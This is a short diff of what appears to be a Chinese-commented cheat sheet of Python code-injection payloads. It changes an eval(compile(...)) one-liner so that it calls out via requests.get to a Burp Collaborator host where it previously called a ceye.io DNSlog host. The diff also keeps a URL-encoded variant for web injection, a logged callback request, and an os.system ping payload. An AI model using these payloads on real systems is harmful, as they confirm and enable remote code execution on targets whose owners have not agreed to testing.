@@ -28,9 +28,15 @@ eval(compile('for x in range(1):\n import time\n import os\n os.system(\'ping -c
 #--------python自带函数
 
 
-#利用requests发起请求  py不自带安装该库
-eval(compile('for x in range(1):\n import requests\n requests.get(\'http://vrtg8t.ceye.io\')','a','single'))
-#web中的编码例子eval(compile('for+x+in+range(1)%3A%5Cn+import+requests\n+requests.get(%5C'http%3a%5C%2f%5C%2fvrtg8t.ceye.io%5C')','a','single'))
+#利用requests发起请求  py不自带该库
+eval(compile('for x in range(1):\n import requests\n requests.get(\'http://0qrr4fbj21mvaz6s860xixnn7ed41t.burpcollaborator.net\')','a','single'))
+
+# GET / HTTP/1.1
+# Host: 0qrr4fbj21mvaz6s860xixnn7ed41t.burpcollaborator.net
+# Connection: keep-alive
+# Accept-Encoding: gzip, deflate
+# Accept: */*
+# User-Agent: python-requests/2.22.0
 
 
 #---------- 启动web服务器
